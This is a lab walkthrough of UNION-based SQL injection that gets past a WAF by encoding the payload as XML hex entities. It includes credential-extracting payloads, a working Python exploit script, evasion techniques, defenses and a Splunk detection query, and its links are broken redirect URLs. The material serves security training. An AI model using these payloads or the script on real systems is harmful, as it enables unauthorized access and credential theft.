# Lab Walkthrough: SQL Injection with Filter Bypass via XML Encoding

* **Vulnerability Type:** In-Band SQL Injection (UNION-Based) / WAF Evasion
* **Target Context:** XML External Input & Parsing Differential
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 15–20 minutes
* **Lab Status:** Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]
> The methodologies, proof-of-concept (PoC) scripts, and techniques documented in this repository are strictly for educational purposes, CTF preparation, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](https://www.google.com/search?q=%25231-vulnerability-architecture--mechanism&utm_source=gemini)
2. [Lab Objectives & Verification Criteria](https://www.google.com/search?q=%25232-lab-objectives--verification-criteria&utm_source=gemini)
3. [Step-by-Step Exploitation Flow](https://www.google.com/search?q=%25233-step-by-step-exploitation-flow&utm_source=gemini)
4. [WAF Bypass & Parsing Differentials Comparison](https://www.google.com/search?q=%25234-waf-bypass--parsing-differentials-comparison&utm_source=gemini)
5. [Automated Exploitation Script (Python PoC)](https://www.google.com/search?q=%25235-automated-exploitation-script-python-poc&utm_source=gemini)
6. [Defense & Prevention](https://www.google.com/search?q=%25236-defense--prevention&utm_source=gemini)
7. [Detection & SIEM Monitoring Rules](https://www.google.com/search?q=%25237-detection--siem-monitoring-rules&utm_source=gemini)
8. [Troubleshooting & Diagnostic Runbook](https://www.google.com/search?q=%25238-troubleshooting--diagnostic-runbook&utm_source=gemini)
9. [References & Standards](https://www.google.com/search?q=%25239-references--standards&utm_source=gemini)

---

## 1. Vulnerability Architecture & Mechanism

This vulnerability highlights a critical architectural flaw known as a **Parsing Differential** (or Impedance Mismatch) between a Web Application Firewall (WAF) and the backend application.

* **The Core Flaw:** The application accepts data in XML format and dynamically concatenates the parsed XML values into a SQL query. A front-end WAF is deployed to block standard SQLi payloads (like `UNION SELECT`).
* **The Mechanism:** When an attacker obfuscates the payload using XML Hex Entities (e.g., changing `U` to `&#x55;`), the WAF inspects the raw HTTP stream, sees no matching SQL signatures, and allows the request through. The backend application's XML parser then natively decodes the hex entities back into the raw payload (`UNION SELECT`) *before* passing the data to the vulnerable SQL execution function.
* **Real-World Analogy:** Imagine a security checkpoint (WAF) looking for the word "BOMB". If you hand the guard a note written in Morse Code, the guard doesn't recognize the letters and lets you pass. Once inside, you hand the note to an operator who translates the Morse Code back to English (XML decoding) and executes the dangerous instruction.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                   XML ENCODING WAF BYPASS FLOW                         │
└────────────────────────────────────────────────────────────────────────┘

  [1. Attacker Request] 
  <storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; SELECT...</storeId>

  [2. WAF Inspection]
  Regex matching: /UNION SELECT/i
  Result: No match found. Request permitted.
  
  [3. Backend XML Parser]
  Decodes XML Hex Entities natively.
  Value becomes: "1 UNION SELECT..."

  [4. Database Execution]
  Vulnerable SQL query concatenates the decoded string.
  Data is extracted successfully.

```

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The `POST /product/stock` endpoint (specifically the `<storeId>` XML node).
* **Primary Objective:** Evade the WAF using XML entity encoding to execute a UNION SQL injection, extract the `administrator` credentials, and authenticate.
* **Validation Signal:** The lab is marked solved upon successful authentication into the administrator panel.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Vulnerability Identification & WAF Trigger

* Intercept the `POST /product/stock` request in Burp Suite.
* **Math Evaluation Test:** Modify the XML node to `<storeId>1+1</storeId>`. The application returns the stock for store ID 2, proving the input is dynamically evaluated by the backend database.
* **WAF Trigger:** Attempt a standard UNION injection: `<storeId>1 UNION SELECT NULL</storeId>`.
* *Result:* The application returns an `HTTP 403 Forbidden` or a "Potential attack detected" message. The WAF is actively blocking SQL keywords.

### Phase 2: Obfuscation & Evasion

* To bypass the WAF, the payload must be rewritten in a format the WAF ignores but the backend XML parser understands.
* Highlight the payload in Burp Suite, right-click, and use the Hackvertor extension (or Decoder) to encode the injection string into XML Hex Entities.
* *Original:* `1 UNION SELECT NULL`
* *Encoded:* `1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x4e;&#x55;&#x4c;&#x4c;`


* Send the encoded payload.
* *Result:* `HTTP 200 OK`. The WAF was successfully bypassed.

### Phase 3: Data Exfiltration

* Map the column count (which evaluates to a single column) and construct the extraction payload using string concatenation.
* **Payload:** `1 UNION SELECT username || '~' || password FROM users`
* Encode this entire payload into XML hex entities.
* Inject it into the `<storeId>` node and submit the request.
* *Result:* The application returns the usernames and passwords (e.g., `administrator~p4ssw0rd`) within the stock count response.

### Phase 4: Account Takeover

* Navigate to the `/login` endpoint.
* Authenticate using the extracted credentials to solve the lab.

---

## 4. WAF Bypass & Parsing Differentials Comparison

Attackers constantly seek discrepancies in how different layers of the technology stack parse data.

| Evasion Technique | Target Context | Mechanism |
| --- | --- | --- |
| **XML/JSON Encoding** | API Endpoints | WAF inspects raw stream; Backend decodes structured data before processing. |
| **HTTP Parameter Pollution** | URL Query Strings | Sending `?id=1&id=UNION...`. WAF checks first parameter; Backend processes the second. |
| **Chunked Transfer Encoding** | HTTP Body | Attacker chunks the payload across multiple HTTP boundaries. WAF fails to reassemble before inspection. |
| **Whitespace/Comment Obfuscation** | SQL Engine | Using `/**/` or `%0a` instead of spaces (e.g., `UNION/**/SELECT`). Bypasses basic WAF regex. |

---

## 5. Automated Exploitation Script (Python PoC)

This script automates the XML hex entity encoding process, allowing for rapid payload delivery without relying on manual Burp Suite extensions.

```python
#!/usr/bin/env python3
"""
XML Encoding WAF Bypass Automator (PoC)
Encodes SQLi payloads into XML hex entities to exploit parsing differentials.
"""

import requests
import re
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def encode_hex_entities(payload_str):
    """Converts a standard string into XML hex entities (e.g., &#x41;)"""
    return ''.join(f'&#x{ord(c):02x};' for c in payload_str)

def exploit_xml_sqli(target_url):
    session = requests.Session()
    stock_endpoint = f"{target_url}/product/stock"
    
    # The raw SQLi payload to extract credentials via concatenation
    raw_payload = "1 UNION SELECT username || '~' || password FROM users"
    
    # Encode the payload to bypass the WAF
    encoded_payload = encode_hex_entities(raw_payload)
    print(f"[*] Raw Payload: {raw_payload}")
    print(f"[*] Encoded Payload: {encoded_payload}")
    
    # Construct the XML body expected by the application
    xml_data = f"""<?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>1</productId>
        <storeId>{encoded_payload}</storeId>
    </stockCheck>"""
    
    headers = {'Content-Type': 'application/xml'}
    
    print("[*] Transmitting obfuscated payload through WAF...")
    response = session.post(stock_endpoint, data=xml_data, headers=headers, verify=False)
    
    if response.status_code == 200:
        # Regex to locate the administrator credentials separated by the tilde
        matches = re.search(r'administrator~([a-zA-Z0-9]{1,32})', response.text, re.IGNORECASE)
        if matches:
            admin_pass = matches.group(1)
            print(f"\n[+] WAF BYPASS SUCCESSFUL")
            print(f"[!] CRITICAL DATA COMPROMISED:")
            print(f"    Username: administrator")
            print(f"    Password: {admin_pass}")
            print("\n[*] Proceed to /login to complete account takeover.")
        else:
            print("[-] Payload executed, but credentials were not found in the response DOM.")
    else:
        print(f"[-] Exploit blocked or failed. HTTP Status: {response.status_code}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 xml_waf_bypass.py <TARGET_BASE_URL>")
        sys.exit(1)
        
    exploit_xml_sqli(sys.argv[1].rstrip('/'))

```

---

## 6. Defense & Prevention

* **Parameterized Queries (Primary Defense):** A WAF is merely a bandage. If the backend code uses prepared statements, SQL injection is structurally impossible, rendering WAF bypass techniques completely irrelevant. The database will safely interpret the decoded `UNION SELECT` as a literal string.
* **WAF Normalization:** Modern WAFs must be configured to normalize and decode input (URL decoding, XML entity decoding, JSON parsing) *before* applying signature-based rules. If the WAF cannot parse the specific data structure natively, it cannot protect it.
* **Strict Type Validation:** Before passing the parsed XML value to the database, the backend should validate the input. If `<storeId>` is expected to be an integer, the application must cast it to an integer or reject it if it contains letters (even after XML decoding).

---

## 7. Detection & SIEM Monitoring Rules

Security analysts can detect obfuscation attempts by looking for anomalous concentrations of encoding characters in parameters that should hold simple data types.

### Splunk Search Query (SPL)

```spl
index=web_application sourcetype=app_logs 
| search request_body="*&#x*" OR request_body="*&amp;#*"
| eval entity_count=countmatches(request_body, "&#x")
| stats max(entity_count) as Entity_Density, count by src_ip, uri_path
| where Entity_Density > 5

```

*Indicator of Attack (IoA):* Legitimate XML traffic rarely uses heavy hex-entity encoding for standard data fields (like a store ID). A high density of `&#x` strings in a single request strongly indicates an active evasion attempt.

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Payload still blocked by WAF (HTTP 403)** | Partial decoding by WAF. | Some WAFs decode standard XML entities but miss edge cases. Ensure you are encoding *every* character, including spaces (`&#x20;`), not just the letters. |
| **Application returns 0 units / blank response** | SQL execution error. | The WAF was bypassed, but your SQL syntax is wrong. Ensure your `UNION` query matches the column count (1 column) and data type of the original query. |
| **XML Parsing Error (HTTP 400)** | Malformed XML structure. | Ensure you did not accidentally encode the surrounding XML tags `<storeId>` and `</storeId>`. Only the *value* inside the node should be encoded. |

---

## 9. References & Standards

* [OWASP: Web Application Firewall Evaluation Criteria (WAFEC)](https://www.google.com/search?q=https://owasp.org/www-project-web-application-firewall-evaluation-criteria/&utm_source=gemini)
* [PortSwigger: Bypassing WAFs via XML Encoding](https://www.google.com/search?q=https://portswigger.net/web-security/sql-injection/bypassing-wafs&utm_source=gemini)
* [MITRE ATT&CK: T1190 - Exploit Public-Facing Application](https://www.google.com/search?q=https://attack.mitre.org/techniques/T1190/&utm_source=gemini)

---

> **Key Insight:** Relying on edge security (WAFs) to compensate for insecure backend code is a systemic anti-pattern. Evasion techniques succeed by exploiting the disparity in how different parsers interpret the exact same stream of bytes. True security requires defense-in-depth: strict validation at the perimeter, combined with immutable parameterization at the execution layer.
